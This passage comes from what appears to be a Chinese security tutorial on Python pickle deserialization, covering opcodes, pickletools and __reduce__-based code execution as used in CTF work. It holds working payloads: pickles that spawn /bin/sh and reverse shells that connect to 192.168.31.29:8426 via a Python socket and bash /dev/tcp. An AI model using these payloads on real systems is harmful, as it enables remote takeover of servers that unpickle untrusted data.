&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ver_5&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x05\x95\x11\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#8045ff">\x8c\x01&lt;/span>&lt;span style="color:#d88200">1&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01\x8c\x01&lt;/span>&lt;span style="color:#d88200">2&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># python2输出 protocal&amp;lt;=2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ver_0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dp0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">p1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">I1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">sS&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">p2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">I2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ver_1&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ver_2&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">�&lt;/span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>0号版本序列化的结果看起来可读性很强 都是可视的字符，操作码也比较直接地暴露出来，重点关注几个：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Opcode&lt;/th>
&lt;th>Mnemonic&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>(&lt;/td>
&lt;td>MARK&lt;/td>
&lt;td>Push a mark object onto the stack&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>S&lt;/td>
&lt;td>STRING&lt;/td>
&lt;td>string&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>I&lt;/td>
&lt;td>INT&lt;/td>
&lt;td>Push integer or bool; decimal string argument&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>l&lt;/td>
&lt;td>LIST&lt;/td>
&lt;td>build a list from topmost stack items&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>d&lt;/td>
&lt;td>DICT&lt;/td>
&lt;td>build a dict from stack items&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>}&lt;/td>
&lt;td>EMPTY_DICT&lt;/td>
&lt;td>Push empty dict&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>t&lt;/td>
&lt;td>TUPLE&lt;/td>
&lt;td>Build a tuple from topmost stack items&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>)&lt;/td>
&lt;td>EMPTY_TUPLE&lt;/td>
&lt;td>Push empty tuple&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>c&lt;/td>
&lt;td>GLOBAL&lt;/td>
&lt;td>Push self.find_class(module, args); 2 string args&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>R&lt;/td>
&lt;td>REDUCE&lt;/td>
&lt;td>Apply callable to argtuple, both on stack&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>b&lt;/td>
&lt;td>BUILD&lt;/td>
&lt;td>call &lt;code>__setstate__&lt;/code> or &lt;code>__dict__.update()&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>i&lt;/td>
&lt;td>INST&lt;/td>
&lt;td>build &amp;amp; push class instance&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>o&lt;/td>
&lt;td>OBJ&lt;/td>
&lt;td>build &amp;amp; push class instance&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.&lt;/td>
&lt;td>STOP&lt;/td>
&lt;td>Every pickle ends with STOP&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>使用**&lt;u>pickletools&lt;/u>**可以将opcode转化为肉眼可读取的形式&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickletools&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">cbuiltins&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">exec&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x13\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">key1=b&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">key2=b&amp;#39;2&amp;#39;q&lt;/span>&lt;span style="color:#8045ff">\x01\x85&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">Rq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">.&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pickletools&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dis&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span> \&lt;span style="color:#111">x80&lt;/span> &lt;span style="color:#111">PROTO&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span> &lt;span style="color:#d88200">&amp;#39;builtins exec&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">17&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">19&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">X&lt;/span> &lt;span style="color:#111">BINUNICODE&lt;/span> &lt;span style="color:#d88200">&amp;#34;key1=b&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">key2=b&amp;#39;2&amp;#39;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">43&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">45&lt;/span>&lt;span style="color:#111">:&lt;/span> \&lt;span style="color:#111">x85&lt;/span> &lt;span style="color:#111">TUPLE1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">48&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">R&lt;/span> &lt;span style="color:#111">REDUCE&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">49&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">51&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">STOP&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">highest&lt;/span> &lt;span style="color:#111">protocol&lt;/span> &lt;span style="color:#111">among&lt;/span> &lt;span style="color:#111">opcodes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="可以利用的方向思路">可以利用的方向&amp;amp;思路&lt;/h2>
&lt;p>pickle的应用场景其实很广泛&lt;/p>
&lt;ul>
&lt;li>解析认证token, session时；参见：&lt;a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">掌阅iReader某站Python漏洞挖掘&lt;/a>（一个redis+python反序列化的栗子&lt;/li>
&lt;li>可能将对象pickle后存储成磁盘文件&lt;/li>
&lt;li>可能将对象pickle后在网络中传输&lt;/li>
&lt;li>可能会通过参数传递给程序；参见：&lt;a href="https://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/">sqlmap的代码执行漏洞&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>这里说一下第一点，flask配合redis在服务端存储session（以pickle序列化形式进行存储），如果通过cookie进行请求session_id时，session种的内容就会被反序列化。理论上没问题，但如果出现redis的未授权访问，就可以通过自己设计恶意的session，然后再设置cookie去请求session时，我们自定的内容就会被反序列化，达到了rce的目的。&lt;/p>
&lt;p>构造反序列化的payload离不开&lt;code>__reduce__&lt;/code>这个魔术方法（上文简单的提到过），它是新式类（内置类）特有的方法（关于更多python元类相关的知识可以参考stackoverflow的这篇帖子：&lt;a href="https://stackoverflow.com/questions/100003/what-are-metaclasses-in-python">What are metaclasses in Python?&lt;/a>）&lt;/p>
&lt;p>————在python2有两种声明类的方式，并且它们实例化的对象性质是不同的&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809005621153.png" alt="image-20210809005621153">&lt;/p>
&lt;p>python3中消除了两者的区别，表现为第二种&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809005849080.png" alt="image-20210809005849080">&lt;/p>
&lt;p>回到关于&lt;code>__reduce__&lt;/code>的问题，只要在新式类中定义一个 &lt;code>__reduce__&lt;/code> 方法，我们就能在序列化的使用让这个类根据我们在&lt;code>__reduce__&lt;/code> 中指定的方式进行序列化。指定的关键就在于该方法的返回值上：一个&lt;code>callable&lt;/code>可调用的对象，一个是&lt;code> ([para1, para2, ...])[, ...])&lt;/code>，该对象所需的参数元组；最简单的例子是&lt;code>return (os.system, ('ls',))&lt;/code>。&lt;code>__reduce__&lt;/code> 方法与opcode中的R指令码关系密切，可以说PVM的R指令码就是&lt;code>__reduce__&lt;/code>的返回值的一个底层实现。&lt;/p>
&lt;h3 id="此处上一个简单的小栗子">此处上一个简单的小栗子&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># shell.pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cos&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">system&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809002248690.png" alt="image-20210809002248690">&lt;/p>
&lt;p>上面手写的opcode成功返回了sh的shell；而通过dumps和loads实现则是这样；我们执行的代码都在&lt;code>__reduce__&lt;/code>中&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># py2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">test&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">test&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">test&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809011024984.png" alt="image-20210809011024984">&lt;/p>
&lt;p>也顺利返回了shell，很容易发现跟上面手写的opcode并无差异，而这个核心就是构造时的&lt;code>__reduce__&lt;/code>函数的返回值，我们可以利用它来rce，反弹shell之类的。&lt;/p>
&lt;h3 id="另一个反弹shell的小栗子">另一个反弹shell的小栗子&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;python2 -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;192.168.31.29&amp;#34;,8426));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 或者最简单的手写opcode 不用特意构造class A()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cos&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">system&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.29/8426 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809090941558.png" alt="image-20210809090941558">&lt;/p>
&lt;p>参考：&lt;a href="https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/">Linux反弹shell（一）文件描述符与重定向&lt;/a> | &lt;a href="https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/">Linux 反弹shell（二）反弹shell的本质&lt;/a>&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子1 - [DasCTF 0721] easyweb
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/#easyweb">之前写过了&lt;/a>，在对session的处理时使用了pickle，我们可以构造恶意的session反弹shell；也没有特殊的过滤和限制，payload怎么写都行&lt;/p>
&lt;/details>
&lt;h3 id="用marshal序列化任意代码对象">用Marshal序列化任意代码对象&lt;/h3>
&lt;p>如果只在&lt;code>__reduce__&lt;/code>中用&lt;code>-c&lt;/code>参数执行代码的话，遇到一些自定函数 在格式上就会比较麻烦&lt;/p>
&lt;p>前面提到pickle不能序列化代码对象，来个实例&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># py2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">&amp;lt;=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">n&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;fib(10)=&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809094914448.png" alt="image-20210809094914448">&lt;/p>
&lt;p>但也不是绝路一条，&lt;strong>Marshal&lt;/strong>可以让这段代码序列化&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># py2&lt;/span>
